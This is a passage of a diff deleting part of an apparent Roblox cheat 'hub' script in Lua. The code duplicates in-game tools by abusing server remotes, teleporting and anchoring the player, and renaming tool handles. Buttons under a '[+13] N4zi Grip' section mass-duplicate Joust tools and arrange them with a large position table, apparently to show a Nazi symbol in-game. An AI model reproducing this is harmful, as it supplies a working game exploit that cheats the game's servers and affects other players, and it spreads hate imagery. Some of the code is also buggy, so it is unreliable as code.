-        table.insert(TablaGripPos, Vector3.new(2, 50, -50)) 
-    else
-        table.insert(TablaGripPos, Vector3.new((i - 1) * 2, 50, -50)) 
-    end
-end
-
-local toolCount = 0
-for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-    if tool:IsA("Tool") and tool.Name == toolselected then
-        toolCount = toolCount + 1
-    end
-end
-for _, tool in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-    if tool:IsA("Tool") and tool.Name == toolselected then
-        toolCount = toolCount + 1
-    end
-end
-
-if toolCount >= dupeamot then
-    for i, tool in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-        if tool:IsA("Tool") and tool.Name == toolselected then
-            tool.Parent = game.Players.LocalPlayer.Backpack
-        end
-    end
-    for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-        if tool:IsA("Tool") and tool.Name == toolselected then
-            tool.Parent = game.Players.LocalPlayer.Character
-            local gripPosIndex = math.min(i, #TablaGripPos)
-            local gripPos = TablaGripPos[gripPosIndex]
-            tool.GripPos = gripPos
-        end
-    end
-else
-    
-    local args = {
-        [1] = "ClearAllTools"
-    }
-    
-    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args))
-    
-    wait(0.2)
-    
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Duplicate",
-        Text = "Do not click on anything while the tools are being duplicated",
-        Button1 = "Ok",
-        Duration = 3
-    })
-    
-    if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
-        task.wait()
-        game.Players.LocalPlayer.Character.Humanoid.Sit = false
-    end
-    
-    wait(0.1)
-    
-    if game:GetService("Workspace"):FindFirstChild("Camera") then
-        game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-    end
-    
-    for m = 1, 2 do
-        task.wait()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
-    end
-    
-    task.wait(0.2)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-    wait(0.5)
-    
-    for aidj, afh in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-        if not afh.Name == toolselected then
-            if afh:IsA("Tool") then
-                afh.Parent = game.Players.LocalPlayer.Backpack
-            end
-        end
-    end
-    
-    for aiefhiewhwf, dvjbvj in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
-        if dvjbvj:IsA("Tool") then
-            if not dvjbvj.Name == toolselected then
-                dvjbvj:Destroy()
-            end
-        end
-    end
-    
-    for ttjtjutjutjjtj, ddvdvdsvdfbrnytytmvdv in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-        if ddvdvdsvdfbrnytytmvdv:IsA("Tool") then
-            if not ddvdvdsvdfbrnytytmvdv.name == toolselected then
-                ddvdvdsvdfbrnytytmvdv:Destroy()
-            end
-        end
-    end
-    
-    for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-        if toollel:IsA("Tool") then
-            if toollel.Name == toolselected then
-                toollllfoun2 = true
-                for basc, aijfw in pairs(toollel:GetDescendants()) do
-                    if aijfw.Name == "Handle" then
-                        aijfw.Name = "Hâ¥aâ¥nâ¥dâ¥lâ¥e"
-                        toollel.Parent = game.Players.LocalPlayer.Backpack
-                        toollel.Parent = game.Players.LocalPlayer.Character
-                        tolllahhhh = toollel
-                        task.wait()
-                    end
-                end
-            else
-                toollllfoun2 = false
-            end
-        end
-    end
-    
-    for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
-        if toollll:IsA("Tool") then
-            if toollll.Name == toolselected then
-                toollllfoun = true
-                for nana, jjsjsj in pairs(toollll:GetDescendants()) do
-                    if jjsjsj.Name == "Handle" then
-                        toollll.Parent = game.Players.LocalPlayer.Character
-                        wait()
-                        jjsjsj.Name = "Hâ¥aâ¥nâ¥dâ¥lâ¥e"
-                        toollll.Parent = game.Players.LocalPlayer.Backpack
-                        toollll.Parent = game.Players.LocalPlayer.Character
-                        toolllffel = toollll
-                    end
-                end
-            else
-                toollllfoun = false
-            end
-        end
-    end
-    
-    if toollllfoun == true then
-        if game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil then
-            toollllfoun = false
-        end
-        repeat
-            wait()
-        until game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil
-        toollllfoun = false
-    end
-    
-    if toollllfoun2 == true then
-        if game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil then
-            toollllfoun2 = false
-        end
-        repeat
-            wait()
-        until game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil
-        toollllfoun2 = false
-    end
-    
-    wait(0.1)
-    
-    for m = 1, dupeamot do
-        if duping == false then
-            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-            return
-        end
-        if game:GetService("Workspace"):FindFirstChild("Camera") then
-            game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-        end
-        if m <= dupeamot then
-        elseif m == dupeamot or m >= dupeamot - 1 then
-        end
-        local args = {
-            [1] = "PickingTools",
-            [2] = toolselected
-        }
-        picktoolremote:InvokeServer(unpack(args))
-        game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolselected).Parent = game.Players.LocalPlayer.Character
-        if duping == false then
-            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-            return
-        end
-        wait()
-        game:GetService("Players").LocalPlayer.Character[toolselected]:FindFirstChild("Handle").Name = "Hâ¥aâ¥nâ¥dâ¥lâ¥e"
-        game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselected).Parent = game.Players.LocalPlayer.Backpack
-        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselected).Parent = game.Players.LocalPlayer.Character
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Tool",
-            Text = "Tools Duplicates: " .. m .. " / " .. dupeamot,
-            Duration = 1
-        })
-        repeat
-            if game:GetService("Workspace"):FindFirstChild("Camera") then
-                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-            end
-            task.wait()
-        until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselected) == nil
-    end
-    
-    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-    repeat
-        wait()
-    until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
-    repeat
-        wait()
-    until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcf
-    
-    for z, x in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-        if x.Name == toolselected then
-            toolamouth = z
-        end
-    end
-    
-    wait()
-    duping = false
-    wait(0.1)
-    
-    for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-        if tool:IsA("Tool") then
-            tool.Parent = game.Players.LocalPlayer.Character
-            local gripPosIndex = math.min(i, #TablaGripPos)
-            local gripPos = TablaGripPos[gripPosIndex]
-            if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
-                tool.GripPos = gripPos
-            else
-            end
-        end
-    end
-    
-    wait(1)
-    
-    function EquiparTudo()
-        
-        local player = game:GetService("Players").LocalPlayer
-        
-        
-        local function changeAnimation(tool)  
-            if tool:FindFirstChild("CycleNextAnimation") then  
-                tool.CycleNextAnimation:FireServer()  
-            end  
-        end
-        
-        
-        for _, tool in ipairs(player.Backpack:GetChildren()) do  
-            if tool:IsA("Tool") and tool.Name == "PaintRoller" then  
-                changeAnimation(tool)  
-            end  
-        end
-        
-        
-        local character = player.Character or player.CharacterAdded:Wait()  
-        for _, tool in ipairs(character:GetChildren()) do  
-            if tool:IsA("Tool") and tool.Name == "PaintRoller" then  
-                changeAnimation(tool)  
-            end  
-        end
-        
-    end
-    
-    EquiparTudo()
-    wait(1)
-    EquiparTudo()
-    wait(1)
-    EquiparTudo()
-    
-    function startSpin()
-        local Players = game:GetService("Players")
-        local RunService = game:GetService("RunService")
-        local player = Players.LocalPlayer
-        local character = player.Character or player.CharacterAdded:Wait()
-        local rootPart = character:WaitForChild("HumanoidRootPart")
-        
-        task.wait(1)  
-        
-        local spinSpeed = math.rad(1750) 
-  
-        RunService.RenderStepped:Connect(function(dt)  
-            rootPart.CFrame = rootPart.CFrame * CFrame.Angles(0, spinSpeed * dt, 0)  
-        end)
-    
-    
-    end
-    
-    startSpin() end
-end
-})
-
-local selectedColor = colorsTable[1].Color
-
-local function applySelectedColor()
-    local LocalPlayer = game:GetService("Players").LocalPlayer
-    local backpack = LocalPlayer.Backpack
-    local character = LocalPlayer.Character
-    local args = {selectedColor}
-
-    local function changeToolColor(tool)
-        if tool:IsA("Tool") and tool.Name == "PaintRoller" then
-            local SetColor = tool:FindFirstChild("SetColor", true)
-            if SetColor then
-                SetColor:FireServer(unpack(args))
-            end
-        end
-    end
-
-    for _, tool in ipairs(backpack:GetChildren()) do
-        changeToolColor(tool)
-    end
-    for _, tool in ipairs(character:GetChildren()) do
-        changeToolColor(tool)
-    end
-end
-
-local function equipAndUnequipTools(callback)
-    local LocalPlayer = game:GetService("Players").LocalPlayer
-    local backpack = LocalPlayer.Backpack
-    local character = LocalPlayer.Character
-
-    local function unequipTools()
-        for _, tool in ipairs(character:GetChildren()) do
-            if tool:IsA("Tool") and tool.Name == "PaintRoller" then
-                tool.Parent = backpack
-            end
-        end
-    end
-
-    local function equipTools()
-        for _, tool in ipairs(backpack:GetChildren()) do
-            if tool:IsA("Tool") and tool.Name == "PaintRoller" then
-                tool.Parent = character
-            end
-        end
-    end
-
-    unequipTools()
-    wait(0.7)
-    if callback then callback() end
-    wait(0.7)
-    equipTools()
-end
-
-ToolsTab:AddDropdown({
-    Name = "Select a Color",
-    Description = "Choose a color to apply",
-    Options = (function()
-        local colorNames = {}
-        for _, color in ipairs(colorsTable) do
-            table.insert(colorNames, color.Name)
-        end
-        return colorNames
-    end)(),
-    Default = colorsTable[1].Name,
-    Callback = function(selected)
-        for _, color in ipairs(colorsTable) do
-            if color.Name == selected then
-                selectedColor = color.Color
-                equipAndUnequipTools(applySelectedColor)
-                break
-            end
-        end
-    end
-})
-
-local function applyRGBCycle()
-    local LocalPlayer = game:GetService("Players").LocalPlayer
-    local backpack = LocalPlayer.Backpack
-    local character = LocalPlayer.Character
-    local toolIndex = 0
-    local totalColors = #colorsTable
-
-    local function changeToolColor(tool, color)
-        if tool:IsA("Tool") and tool.Name == "PaintRoller" then
-            local SetColor = tool:FindFirstChild("SetColor", true)
-            if SetColor then
-                SetColor:FireServer(color)
-            end
-        end
-    end
-
-    for _, tool in ipairs(backpack:GetChildren()) do
-        if tool.Name == "PaintRoller" then
-            toolIndex = toolIndex + 1
-            local color = colorsTable[(toolIndex - 1) % totalColors + 1].Color
-            changeToolColor(tool, color)
-        end
-    end
-    for _, tool in ipairs(character:GetChildren()) do
-        if tool.Name == "PaintRoller" then
-            toolIndex = toolIndex + 1
-            local color = colorsTable[(toolIndex - 1) % totalColors + 1].Color
-            changeToolColor(tool, color)
-        end
-    end
-end
-
-ToolsTab:AddButton({
-    Name = "Colorful",
-    Callback = function()
-        equipAndUnequipTools(applyRGBCycle)
-    end
-})
-
-local colorCombinations = {}
-for i, color1 in ipairs(colorsTable) do
-    for j, color2 in ipairs(colorsTable) do
-        if i ~= j then
-            table.insert(colorCombinations, {Name = color1.Name .. " e " .. color2.Name, Colors = {color1.Color, color2.Color}})
-        end
-    end
-end
-
-ToolsTab:AddDropdown({
-    Name = "Select a Color Combination",
-    Description = "Choose a color combination to apply",
-    Options = (function()
-        local combinationNames = {}
-        for _, combination in ipairs(colorCombinations) do
-            table.insert(combinationNames, combination.Name)
-        end
-        return combinationNames
-    end)(),
-    Default = colorCombinations[1].Name,
-    Callback = function(selected)
-        for _, combination in ipairs(colorCombinations) do
-            if combination.Name == selected then
-                local function applyDoubleColor()
-                    local LocalPlayer = game:GetService("Players").LocalPlayer
-                    local backpack = LocalPlayer.Backpack
-                    local character = LocalPlayer.Character
-                    local toolIndex = 0
-                    local colors = combination.Colors
-
-                    local function changeToolColor(tool, color)
-                        if tool:IsA("Tool") and tool.Name == "PaintRoller" then
-                            local SetColor = tool:FindFirstChild("SetColor", true)
-                            if SetColor then
-                                SetColor:FireServer(color)
-                            end
-                        end
-                    end
-
-                    for _, tool in ipairs(backpack:GetChildren()) do
-                        if tool.Name == "PaintRoller" then
-                            toolIndex = toolIndex + 1
-                            local color = colors[(toolIndex - 1) % 2 + 1]
-                            changeToolColor(tool, color)
-                        end
-                    end
-                    for _, tool in ipairs(character:GetChildren()) do
-                        if tool.Name == "PaintRoller" then
-                            toolIndex = toolIndex + 1
-                            local color = colors[(toolIndex - 1) % 2 + 1]
-                            changeToolColor(tool, color)
-                        end
-                    end
-                end
-                equipAndUnequipTools(applyDoubleColor)
-                break
-            end
-        end
-    end
-})
-
-local cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s")
-local picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
-
-local Section = ToolsTab:AddSection({
-    Name = "Items Control"
-})
-
-ToolsTab:AddButton({
-    Name = "Equip All Tools",
-    Callback = function()
-        for _, tool in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
-            if tool:IsA("Tool") then
-                tool.Parent = game.Players.LocalPlayer.Character
-            end
-        end
-    end
-})
-
-ToolsTab:AddButton({
-    Name = "Clear All Tools",
-    Callback = function()
-        local args = {
-            [1] = "ClearAllTools"
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args))
-    end
-})
-
-Section = ToolsTab:AddSection({
-    Name = "[+13] N4zi Grip"
-})
-
-ToolsTab:AddParagraph({ "We don't support these types of things, this is on the Hub just for fun" })
-
-ToolsTab:AddButton({
-    Name = "Giant Joust Blue N4zi",
-    Callback = function()
-       toolselcted = "JoustBlue"
-        dupeamot = 175 
-        picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
-        cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s")
-                                duping = true
-                                oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-game:GetService("StarterGui"):SetCore("SendNotification",{Title="Warn!",Text="Please do not equip any tools or unequip tools or click tools on inventory. It will break the script.", Button1 = "I understand" ,Duration=5})
-                                if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
-                                        task.wait()
-                                        game.Players.LocalPlayer.Character.Humanoid.Sit = false
-                                end
-                                wait(0.1)
-                                if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                        game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                                        for m=1,2 do task.wait()
-                                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
-                                                end
-                                                task.wait(0.2)
-                                                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-                                wait(0.5)
-                                for aidj,afh in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-                                        if afh.Name == toolselcted == false then
-                                                if afh:IsA("Tool") then
-                                                        afh.Parent = game.Players.LocalPlayer.Backpack
-                                                end
-                                        end
-                                end
-                                for aiefhiewhwf,dvjbvj in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
-                                        if dvjbvj:IsA("Tool") then
-                                                if dvjbvj.Name == toolselcted == false then
-                                                        dvjbvj:Destroy()
-                                                end
-                                        end
-                                end
-                                for ttjtjutjutjjtj,ddvdvdsvdfbrnytytmvdv in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-                                        if ddvdvdsvdfbrnytytmvdv:IsA("Tool") then
-                                                if ddvdvdsvdfbrnytytmvdv.name == toolselcted == false then
-                                                        ddvdvdsvdfbrnytytmvdv:Destroy()
-                                                end
-                                        end
-                                end
-                                for findin,toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-                                        if toollel:IsA("Tool") then
-                                                if toollel.Name == toolselcted then
-                                                        toollllfoun2 = true
-                                                        for basc,aijfw in pairs(toollel:GetDescendants()) do
-                                                                if aijfw.Name == "Handle" then
-                                                                        aijfw.Name = "Hâ¥aâ¥nâ¥dâ¥lâ¥e"
-                                                                        toollel.Parent = game.Players.LocalPlayer.Backpack
-                                                                toollel.Parent = game.Players.LocalPlayer.Character
-                                                                tollllahhhh = toollel
-                                                                task.wait()
-                                                        end
-                                                end
-                                        else toollllfoun2 = false
-                                        end
-                                end
-                        end
-                                for fiifi,toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
-                                        if toollll:IsA("Tool") then
-                                                if toollll.Name == toolselcted then
-                                                        toollllfoun = true
-                                                        for nana,jjsjsj in pairs(toollll:GetDescendants()) do
-                                                                if jjsjsj.Name == "Handle" then
-                                                                        toollll.Parent = game.Players.LocalPlayer.Character
-                                                wait()
-                                                jjsjsj.Name = "Hâ¥aâ¥nâ¥dâ¥lâ¥e"
-                                                toollll.Parent = game.Players.LocalPlayer.Backpack
-                                                toollll.Parent = game.Players.LocalPlayer.Character
-                                                toolllffel = toollll
-                                                                end
-                                                        end
-                                                else toollllfoun = false
-                                        end
-                                end
-                                end
-                                if toollllfoun == true then
-                                                                        if game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil then  toollllfoun = false end
-                                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil
-                                toollllfoun = false
-                                end
-                                if toollllfoun2 == true then
-                                        if game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil then toollllfoun2 = false end
-                                        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil
-                                        toollllfoun2 = false
-                                end
-                                wait(1)
-                                for m=1, dupeamot do
-                                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
-                                        if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                                                if m <= dupeamot then
-                elseif m == dupeamot or m >= dupeamot - 1 then
-                end
-                                        local args = {
-                                                [1] = "PickingTools",
-                                                [2] = toolselcted
-                                        }
-                                        
-                                        picktoolremote:InvokeServer(unpack(args))
-                                        game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolselcted).Parent = game.Players.LocalPlayer.Character
-                                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
-                                        wait()
-                                        game:GetService("Players").LocalPlayer.Character[toolselcted]:FindFirstChild("Handle").Name = "Hâ¥aâ¥nâ¥dâ¥lâ¥e"
-                                        game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack
-                                        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character
-                                        repeat         if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                                                 task.wait() until
-                                                 game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted) == nil
-                                end
-                                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
-                                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcf
-                                for z,x in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-                                        if x.Name == toolselcted then
-                                                toolamouth = z
-                                        end
-                                end
-                                wait()
-                                duping = false
-   wait(1)
-
-
-local TablaGripPos = {
-                      Vector3.new(0, 3, 6),
-                      Vector3.new(1, 3, 6),
-                      Vector3.new(2, 3, 6),
-                      Vector3.new(3, 3, 6),
-                      Vector3.new(4, 3, 6),
-                      Vector3.new(5, 3, 6),
-                      Vector3.new(6, 3, 6),
-                      Vector3.new(0, 3, 17),
-                      Vector3.new(1, 3, 17),
-                      Vector3.new(2, 3, 17),
-                      Vector3.new(3, 3, 17),
-                      Vector3.new(4, 3, 17),
-                      Vector3.new(5, 3, 17),
-                      Vector3.new(6, 3, 17),
-                      Vector3.new(0, 3, 30),
-                      Vector3.new(1, 3, 30),
-                      Vector3.new(2, 3, 30),
-                      Vector3.new(3, 3, 30),
-                      Vector3.new(4, 3, 30),
-                      Vector3.new(5, 3, 30),
-                      Vector3.new(6, 3, 30),
-                      Vector3.new(0, 3, 43),
-                      Vector3.new(1, 3, 43),
-                      Vector3.new(2, 3, 43),
-                      Vector3.new(3, 3, 43),
-                      Vector3.new(4, 3, 43),
-                      Vector3.new(5, 3, 43),
-                      Vector3.new(6, 3, 43),
-                      Vector3.new(0, 3, 55),
-                      Vector3.new(1, 3, 55),
-                      Vector3.new(2, 3, 55),
-                      Vector3.new(3, 3, 55),
-                      Vector3.new(4, 3, 55),
-                      Vector3.new(5, 3, 55),
-                      Vector3.new(6, 3, 55),
-                      Vector3.new(-1 , 3, 6),
-                      Vector3.new(-2 , 3, 6),
-                      Vector3.new(-3 , 3, 6),
-                      Vector3.new(-4 , 3, 6),
-                      Vector3.new(-5 , 3, 6),
-                      Vector3.new(-6 , 3, 6),
-                      Vector3.new(-7 , 3, 6),
-                      Vector3.new(-8 , 3, 6),
-                      Vector3.new(-9 , 3, 6),
-                      Vector3.new(-10 , 3, 6),
-                      Vector3.new(-11 , 3, 6),
-                      Vector3.new(-12 , 3, 6),
-                      Vector3.new(-13 , 3, 6),
-                      Vector3.new(-14 , 3, 6),
-                      Vector3.new(-15 , 3, 6),
-                      Vector3.new(-16 , 3, 6),
-                      Vector3.new(-17 , 3, 6),
-                      Vector3.new(-18 , 3, 6),
-                      Vector3.new(-19 , 3, 6),
-                      Vector3.new(-20 , 3, 6),
-                      Vector3.new(-21 , 3, 6),
-                      Vector3.new(1 , 3, 55),
-                      Vector3.new(2 , 3, 55),
-                      Vector3.new(3 , 3, 55),
-                      Vector3.new(4 , 3, 55),
-                      Vector3.new(5 , 3, 55),
-                      Vector3.new(6 , 3, 55),
-                      Vector3.new(7 , 3, 55),
-                      Vector3.new(8 , 3, 55),
-                      Vector3.new(9 , 3, 55),
-                      Vector3.new(10 , 3, 55),
-                      Vector3.new(11 , 3, 55),
-                      Vector3.new(12 , 3, 55),
-                      Vector3.new(13 , 3, 55),
-                      Vector3.new(14 , 3, 55),
-                      Vector3.new(15 , 3, 55),
-                      Vector3.new(16 , 3, 55),
-                      Vector3.new(17 , 3, 55),
-                      Vector3.new(18 , 3, 55),
-                      Vector3.new(19 , 3, 55),
-                      Vector3.new(20 , 3, 55),
-                      Vector3.new(21 , 3, 55),
-                      Vector3.new(22 , 3, 55),
-                      Vector3.new(-16, 3, 43),
-                                   Vector3.new(-17, 3, 43),
-                      Vector3.new(-18, 3, 43),
-                      Vector3.new(-19, 3, 43),
-                      Vector3.new(-20, 3, 43),
-                      Vector3.new(-21, 3, 43),
-                      Vector3.new(-16, 3, 43),
-                      Vector3.new(-15, 3, 43),
-                      Vector3.new(-16, 3, 43),
-                                                Vector3.new(-17, 3, 55),
-                      Vector3.new(-18, 3, 55),
-                      Vector3.new(-19, 3, 55),
-                      Vector3.new(-20, 3, 55),
-                      Vector3.new(-21, 3, 55),
-                      Vector3.new(-16, 3, 55),
-                      Vector3.new(-15, 3, 55),
-                      Vector3.new(0, 3, 55),
-                      Vector3.new(1, 3, 55),
-                      Vector3.new(2, 3, 55),
-                      Vector3.new(3, 3, 55),
-                      Vector3.new(4, 3, 55),
-                      Vector3.new(5, 3, 55),
-                      Vector3.new(6, 3, 55),
-         Vector3.new(23 , 3, 55),
-         Vector3.new(24 , 3, 55),
-          Vector3.new(25 , 3, 55),
-           Vector3.new(26 , 3, 55),
-            Vector3.new(27 , 3, 55),
-                         Vector3.new(-1 , 3, 30),
-                      Vector3.new(-2 , 3, 30),
-                      Vector3.new(-3 , 3, 30),
-                      Vector3.new(-4 , 3, 30),
-                      Vector3.new(-5 , 3, 30),
-                      Vector3.new(-6 , 3, 30),
-                      Vector3.new(-7 , 3, 30),
-                      Vector3.new(-8 , 3, 30),
-                      Vector3.new(-9 , 3, 30),
-                      Vector3.new(-10 , 3, 30),
-                      Vector3.new(-11 , 3, 30),
-                      Vector3.new(-12 , 3, 30),
-                      Vector3.new(-13 , 3, 30),
-                      Vector3.new(-14 , 3, 30),
-                      Vector3.new(-15 , 3, 30),
-                      Vector3.new(-16 , 3, 30),
-                      Vector3.new(-17 , 3, 30),
-                      Vector3.new(-18 , 3, 30),
-                      Vector3.new(-19 , 3, 30),
-                      Vector3.new(-20 , 3, 30),
-                      Vector3.new(-21 , 3, 30),
-                          Vector3.new(1 , 3, 30),
-                      Vector3.new(2 , 3, 30),
-                      Vector3.new(3 , 3, 30),
-                      Vector3.new(4 , 3, 30),
-                      Vector3.new(5 , 3, 30),
-                      Vector3.new(6 , 3, 30),
-                      Vector3.new(7 , 3, 30),
-                      Vector3.new(8 , 3, 30),
-                      Vector3.new(9 , 3, 30),
-                      Vector3.new(10 , 3, 30),
-                      Vector3.new(11 , 3, 30),
-                      Vector3.new(12 , 3, 30),
-                      Vector3.new(13 , 3, 30),
-                      Vector3.new(14 , 3, 30),
-                      Vector3.new(15 , 3, 30),
-                      Vector3.new(16 , 3, 30),
-                      Vector3.new(17 , 3, 30),
-                      Vector3.new(18 , 3, 30),
-                      Vector3.new(19 , 3, 30),
-                      Vector3.new(20 , 3, 30),
-                      Vector3.new(21 , 3, 30),
-                      Vector3.new(22 , 3, 30),
-                      Vector3.new(23 , 3, 30),
-                      Vector3.new(24 , 3, 30),
-                      Vector3.new(25 , 3, 30),
-                      Vector3.new(26 , 3, 30),
-                      Vector3.new(27 , 3, 30),
-                      Vector3.new(28 , 3, 30),
-                      Vector3.new(28, 3, 6),
-                      Vector3.new(27, 3, 6),
-                      Vector3.new(26, 3, 6),
-                      Vector3.new(25, 3, 6),
-                      Vector3.new(24, 3, 6),
-                      Vector3.new(23, 3, 6),
-                      Vector3.new(22, 3, 6),
-                      Vector3.new(21, 3, 6),
-                      Vector3.new(21, 3, 17),
-                      Vector3.new(22, 3, 17),
-                      Vector3.new(23, 3, 17),
-                      Vector3.new(24, 3, 17),
-                      Vector3.new(25, 3, 17),
-                      Vector3.new(26, 3, 17),
-                      Vector3.new(27, 3, 17),
-                      Vector3.new(28, 3, 17),
-                         }
-                          for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-                              if tool:IsA("Tool") then                                  
-                                  tool.Parent = game.Players.LocalPlayer.Character
-                                  
-                                  local gripPosIndex = math.min(i, #TablaGripPos)
-                                  local gripPos = TablaGripPos[gripPosIndex]
-                                  
-                                  if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
-                                      tool.GripPos = gripPos
-                                  else
-                                  end
-                              end
-                          end
-    end
-})
-
-ToolsTab:AddButton({
-    Name = "Giant Joust Red N4zi",
-    Callback = function()
-        toolselcted = "JoustRed"
-        dupeamot = 175 
-        picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
-        cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s")
-                                duping = true
-                                oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-game:GetService("StarterGui"):SetCore("SendNotification",{Title="Warn!",Text="Please do not equip any tools or unequip tools or click tools on inventory. It will break the script.", Button1 = "I understand" ,Duration=5})
-                                if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
-                                        task.wait()
-                                        game.Players.LocalPlayer.Character.Humanoid.Sit = false
-                                end
-                                wait(0.1)
-                                if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                        game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                                        for m=1,2 do task.wait()
-                                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
-                                                end
-                                                task.wait(0.2)
-                                                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-                                wait(0.5)
-                                for aidj,afh in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-                                        if afh.Name == toolselcted == false then
-                                                if afh:IsA("Tool") then
-                                                        afh.Parent = game.Players.LocalPlayer.Backpack
-                                                end
-                                        end
-                                end
-                                for aiefhiewhwf,dvjbvj in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
-                                        if dvjbvj:IsA("Tool") then
-                                                if dvjbvj.Name == toolselcted == false then
-                                                        dvjbvj:Destroy()
-                                                end
-                                        end
-                                end
-                                for ttjtjutjutjjtj,ddvdvdsvdfbrnytytmvdv in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-                                        if ddvdvdsvdfbrnytytmvdv:IsA("Tool") then
-                                                if ddvdvdsvdfbrnytytmvdv.name == toolselcted == false then
-                                                        ddvdvdsvdfbrnytytmvdv:Destroy()
-                                                end
-                                        end
-                                end
-                                for findin,toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-                                        if toollel:IsA("Tool") then
-                                                if toollel.Name == toolselcted then
-                                                        toollllfoun2 = true
